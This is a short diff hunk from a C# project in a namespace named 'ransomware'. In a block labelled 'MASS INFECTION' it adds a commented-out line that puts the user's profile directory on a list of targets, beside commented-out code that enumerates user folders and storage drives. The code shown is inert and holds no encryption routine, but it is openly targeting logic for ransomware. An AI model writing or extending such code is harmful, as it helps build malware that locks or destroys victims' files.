@@ -75,6 +75,7 @@ namespace ransomware
             /////////// MASS INFECTION
             //string profile = Environment.GetEnvironmentVariable("USERPROFILE");
             //string userdir = Directory.GetParent(profile).FullName;
+            //list_targets.Add(userdir);
             //List<string> drives = GetListStorageDrives();
             //foreach(string drive in drives)
             //{
